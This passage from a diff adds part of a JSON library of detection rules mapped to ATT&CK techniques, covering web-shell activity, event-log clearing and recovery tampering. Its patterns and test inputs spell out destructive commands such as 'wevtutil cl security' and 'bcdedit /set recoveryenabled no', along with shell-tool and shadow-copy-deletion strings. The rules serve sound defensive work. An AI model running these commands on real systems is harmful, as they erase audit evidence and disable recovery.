+       "op": "contains_any",
+       "value": [
+        "cmd.exe",
+        "powershell",
+        "/bin/sh",
+        "/bin/bash",
+        "wscript",
+        "cscript"
+       ]
+      }
+     ],
+     "exclusions": [],
+     "agg": null,
+     "fp": [
+      "Some apps legitimately shell out (allowlist by path)"
+     ],
+     "tuning": [
+      "Baseline each web app's child processes",
+      "Alert at high severity on servers in the DMZ"
+     ],
+     "tests": [
+      {
+       "name": "w3wp spawns cmd",
+       "input": {
+        "EventID": 1,
+        "ParentImage": "...\\w3wp.exe",
+        "Image": "C:\\Windows\\System32\\cmd.exe"
+       },
+       "expected": "match"
+      }
+     ]
+    },
+    {
+     "id": "EXPLOIT-02",
+     "name": "Web shell file written to web root",
+     "objective": "Detect creation of script files in a web content directory by the web server account.",
+     "logic_type": "process",
+     "severity": "high",
+     "keywords": [
+      "web shell",
+      "web root",
+      "aspx",
+      "jsp",
+      "php"
+     ],
+     "event_ids": [
+      11
+     ],
+     "log_source_types": [
+      "sysmon",
+      "edr"
+     ],
+     "selection": [
+      {
+       "field": "EventID",
+       "op": "eq",
+       "value": 11
+      },
+      {
+       "field": "TargetFilename",
+       "op": "contains_any",
+       "value": [
+        "\\wwwroot\\",
+        "\\htdocs\\",
+        "\\webapps\\",
+        "/var/www/"
+       ]
+      },
+      {
+       "field": "TargetFilename",
+       "op": "endswith_any",
+       "value": [
+        ".aspx",
+        ".asp",
+        ".jsp",
+        ".jspx",
+        ".php",
+        ".ashx"
+       ]
+      }
+     ],
+     "exclusions": [],
+     "agg": null,
+     "fp": [
+      "Legitimate application deployments/updates"
+     ],
+     "tuning": [
+      "Allowlist deployment pipelines",
+      "Alert when the writer is the web service account outside a deploy window"
+     ],
+     "tests": [
+      {
+       "name": "Script written to web root",
+       "input": {
+        "EventID": 11,
+        "TargetFilename": "C:\\inetpub\\wwwroot\\x.aspx",
+        "Image": "...\\w3wp.exe"
+       },
+       "expected": "match"
+      }
+     ]
+    },
+    {
+     "id": "EXPLOIT-03",
+     "name": "Spike in 5xx/4xx then anomalous request",
+     "objective": "Detect a burst of server errors to one path followed by a successful anomalous request \u2014 exploitation attempt.",
+     "logic_type": "multi_source",
+     "severity": "medium",
+     "keywords": [
+      "web",
+      "5xx",
+      "exploit",
+      "anomaly"
+     ],
+     "event_ids": [],
+     "log_source_types": [
+      "web_server"
+     ],
+     "selection": [],
+     "exclusions": [],
+     "agg": {
+      "fn": "sequence",
+      "group_by": [
+       "uri_path"
+      ],
+      "threshold": 2,
+      "window_minutes": 15,
+      "steps": [
+       "burst of 4xx/5xx to one path",
+       "200 to the same path with an unusual method/length"
+      ]
+     },
+     "fp": [
+      "Noisy scanners generating many errors"
+     ],
+     "tuning": [
+      "Pair with WAF telemetry where available"
+     ],
+     "tests": [
+      {
+       "name": "Errors then success",
+       "input": {
+        "step1": {
+         "status": 500,
+         "count": 20,
+         "uri": "/api/x"
+        },
+        "step2": {
+         "status": 200,
+         "uri": "/api/x",
+         "unusual": true
+        }
+       },
+       "expected": "match"
+      }
+     ]
+    }
+   ]
+  },
+  "T1070.001": {
+   "name": "Clear Windows Event Logs",
+   "scenarios": [
+    {
+     "id": "LOGCLEAR-01",
+     "name": "Security event log cleared",
+     "objective": "Detect 1102 (audit log cleared) or 104 (log cleared) events.",
+     "logic_type": "state_change",
+     "severity": "high",
+     "keywords": [
+      "1102",
+      "104",
+      "log cleared",
+      "wevtutil"
+     ],
+     "event_ids": [
+      1102,
+      104
+     ],
+     "log_source_types": [
+      "windows_security"
+     ],
+     "selection": [
+      {
+       "field": "EventID",
+       "op": "in",
+       "value": [
+        1102,
+        104
+       ]
+      }
+     ],
+     "exclusions": [],
+     "agg": null,
+     "fp": [
+      "Rare legitimate maintenance (require change ticket)"
+     ],
+     "tuning": [
+      "Forward logs off-host so clearing does not destroy evidence",
+      "Alert at high severity and create an offense"
+     ],
+     "tests": [
+      {
+       "name": "Security log cleared",
+       "input": {
+        "EventID": 1102
+       },
+       "expected": "match"
+      }
+     ]
+    },
+    {
+     "id": "LOGCLEAR-02",
+     "name": "Log clear via command line",
+     "objective": "Detect wevtutil cl / Clear-EventLog / Remove-EventLog in command telemetry.",
+     "logic_type": "process",
+     "severity": "high",
+     "keywords": [
+      "wevtutil",
+      "clear-eventlog"
+     ],
+     "event_ids": [
+      1,
+      4688
+     ],
+     "log_source_types": [
+      "sysmon",
+      "edr"
+     ],
+     "selection": [
+      {
+       "field": "CommandLine",
+       "op": "contains_any",
+       "value": [
+        "wevtutil cl",
+        "wevtutil clear-log",
+        "clear-eventlog",
+        "remove-eventlog"
+       ]
+      }
+     ],
+     "exclusions": [],
+     "agg": null,
+     "fp": [
+      "Build/imaging scripts that reset logs"
+     ],
+     "tuning": [
+      "Allowlist imaging accounts/hosts"
+     ],
+     "tests": [
+      {
+       "name": "wevtutil cl security",
+       "input": {
+        "EventID": 1,
+        "CommandLine": "wevtutil cl security"
+       },
+       "expected": "match"
+      }
+     ]
+    }
+   ]
+  },
+  "T1490": {
+   "name": "Inhibit System Recovery",
+   "scenarios": [
+    {
+     "id": "RECOV-01",
+     "name": "Backup or recovery tampering",
+     "objective": "Detect commands disabling recovery, deleting shadow copies, or wiping backup catalogs (also feeds ransomware detection).",
+     "logic_type": "process",
+     "severity": "critical",
+     "keywords": [
+      "vssadmin",
+      "bcdedit",
+      "wbadmin",
+      "recovery"
+     ],
+     "event_ids": [
+      1,
+      4688
+     ],
+     "log_source_types": [
+      "sysmon",
+      "edr"
+     ],
+     "selection": [
+      {
+       "field": "CommandLine",
+       "op": "contains_any",
+       "value": [
+        "delete shadows",
+        "delete catalog",
+        "recoveryenabled no",
+        "resize shadowstorage",
+        "wbadmin delete"
+       ]
+      }
+     ],
+     "exclusions": [],
+     "agg": null,
+     "fp": [
+      "Rare legitimate admin maintenance (require change ticket)"
+     ],
+     "tuning": [
+      "Alert at critical severity",
+      "Correlate with mass file modification (RANSOM-01)"
+     ],
+     "tests": [
+      {
+       "name": "Recovery disabled",
+       "input": {
+        "EventID": 1,
+        "CommandLine": "bcdedit /set recoveryenabled no"
+       },
+       "expected": "match"
+      }
+     ]
+    }
+   ]
+  }
+ },
+ "stats": {
+  "techniques": 17,
+  "scenarios": 55
+ }
+}
